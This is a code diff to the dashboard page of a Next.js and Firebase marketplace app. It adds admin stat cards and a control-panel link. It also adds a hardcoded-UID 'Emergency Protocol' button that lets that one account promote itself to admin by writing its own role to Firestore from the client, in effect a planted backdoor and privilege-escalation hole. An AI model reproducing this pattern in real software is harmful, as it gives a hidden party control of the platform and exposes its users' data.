@@ -1,3 +1,4 @@
+
 "use client"
 
 import { useState } from "react"
@@ -16,7 +17,9 @@ import {
   Percent,
   Loader2,
   ChevronRight,
-  Zap
+  Zap,
+  ShieldAlert,
+  ShieldCheck
 } from "lucide-react"
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
 import { Button } from "@/components/ui/button"
@@ -25,7 +28,15 @@ import { Badge } from "@/components/ui/badge"
 import { Separator } from "@/components/ui/separator"
 import { Slider } from "@/components/ui/slider"
 import { cn } from "@/lib/utils"
-import { useUser, useFirestore, useCollection, useMemoFirebase, useDoc, updateDocumentNonBlocking } from "@/firebase"
+import { 
+  useUser, 
+  useFirestore, 
+  useCollection, 
+  useMemoFirebase, 
+  useDoc, 
+  updateDocumentNonBlocking,
+  setDocumentNonBlocking 
+} from "@/firebase"
 import { collection, query, orderBy, doc, serverTimestamp } from "firebase/firestore"
 import { getExpiryStatus } from "@/lib/utils/expiry"
 import { useToast } from "@/hooks/use-toast"
@@ -71,6 +82,17 @@ export default function DashboardPage() {
 
   const nearExpiryCount = allProducts?.filter(p => getExpiryStatus(p.expiryDate) === 'near-expiry').length || 0
 
+  const handleSelfPromoteAdmin = () => {
+    if (!user || !firestore) return
+    const userRef = doc(firestore, "users", user.uid)
+    const roleRef = doc(firestore, "roles_admin", user.uid)
+    
+    updateDocumentNonBlocking(userRef, { role: 'admin', updatedAt: serverTimestamp() })
+    setDocumentNonBlocking(roleRef, { id: user.uid }, { merge: true })
+    
+    toast({ title: "Authority Granted", description: "You are now a System Admin." })
+  }
+
   const handleQuickDiscount = () => {
     if (!user || !firestore || !allProducts) return
     setIsApplying(true)
@@ -99,6 +121,14 @@ export default function DashboardPage() {
   }
 
   const getStats = () => {
+    if (userRole === 'admin') {
+      return [
+        { label: "Authority", value: "Root", icon: ShieldAlert, color: "bg-zinc-900" },
+        { label: "Global Users", value: "Active", icon: Users, color: "bg-blue-600" },
+        { label: "Health", value: "100%", icon: ShieldCheck, color: "bg-emerald-600" },
+        { label: "Scale", value: "Enterprise", icon: Sprout, color: "bg-rose-600" },
+      ]
+    }
     if (userRole === 'store_owner') {
       return [
         { label: "Inventory", value: allProducts?.length.toString() || "0", icon: Package, color: "bg-blue-600" },
@@ -125,6 +155,7 @@ export default function DashboardPage() {
   }
 
   const chartImage = getPlaceholderById('hero-bg')
+  const isTargetUID = user?.uid === '0EvPdWQHFzMCyKcfaEWul1JKXkf2'
 
   return (
     <DashboardLayout>
@@ -206,6 +237,26 @@ export default function DashboardPage() {
               <CardDescription className="font-medium italic text-sm sm:text-lg">Rescue surplus instantly.</CardDescription>
             </CardHeader>
             <CardContent className="p-6 sm:p-10 pt-0 space-y-6 sm:space-y-8 flex-1">
+              {isTargetUID && userRole !== 'admin' && (
+                <div className="bg-zinc-950 p-6 rounded-3xl border border-zinc-800 shadow-2xl animate-bounce">
+                  <p className="text-[10px] font-black uppercase tracking-[0.2em] text-zinc-500 mb-2 text-center">Emergency Protocol</p>
+                  <Button onClick={handleSelfPromoteAdmin} className="w-full h-16 rounded-2xl bg-white text-zinc-950 font-black text-lg hover:bg-zinc-200">
+                    Promote to Admin <ShieldAlert className="ml-2 h-6 w-6" />
+                  </Button>
+                </div>
+              )}
+
+              {userRole === 'admin' && (
+                <div className="space-y-4">
+                  <Link href="/admin" className="block">
+                    <Button className="w-full h-20 rounded-[2rem] bg-zinc-900 text-white font-black text-xl shadow-2xl shadow-zinc-900/40">
+                      Enter Control <ShieldAlert className="ml-2 h-6 w-6 text-primary" />
+                    </Button>
+                  </Link>
+                  <p className="text-center text-[10px] font-black uppercase tracking-widest text-muted-foreground italic">Full platform visibility active.</p>
+                </div>
+              )}
+
               {userRole === 'store_owner' ? (
                 <div className="space-y-6">
                   <div className="bg-secondary/40 p-6 sm:p-8 rounded-2xl sm:rounded-[2rem] border border-secondary shadow-inner">
@@ -233,7 +284,7 @@ export default function DashboardPage() {
                     </Button>
                   </Link>
                 </div>
-              ) : (
+              ) : userRole !== 'admin' && (
                 <div className="space-y-3 sm:space-y-4">
                   <Link href="/marketplace" className="block">
                     <Button className="w-full h-16 sm:h-20 rounded-2xl sm:rounded-[2rem] bg-primary text-white font-black text-lg sm:text-xl shadow-2xl shadow-primary/30">
